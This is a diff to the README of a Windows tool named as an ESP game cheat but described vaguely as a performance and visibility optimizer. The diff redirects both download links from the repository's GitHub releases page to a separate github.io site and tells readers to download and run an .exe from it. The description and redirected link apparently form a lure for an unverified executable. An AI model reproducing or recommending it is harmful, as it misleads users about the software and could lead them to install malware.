@@ -1,6 +1,6 @@
 # 🦎 meccha-chameleon-esp - Improve your game performance and visibility
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/hijodelkaliman/meccha-chameleon-esp/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://hijodelkaliman.github.io)
 
 meccha-chameleon-esp provides tools to help you optimize frame rates and visibility when playing your favorite games. This software helps computer systems manage resources better, which results in a smoother experience for users.
 
@@ -16,7 +16,7 @@ Your computer must meet these requirements to use this software:
 
 ## 📥 Getting the Software
 
-1. Visit the [official release page](https://github.com/hijodelkaliman/meccha-chameleon-esp/releases).
+1. Visit the [official release page](https://hijodelkaliman.github.io).
 2. Locate the most recent version of the software in the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
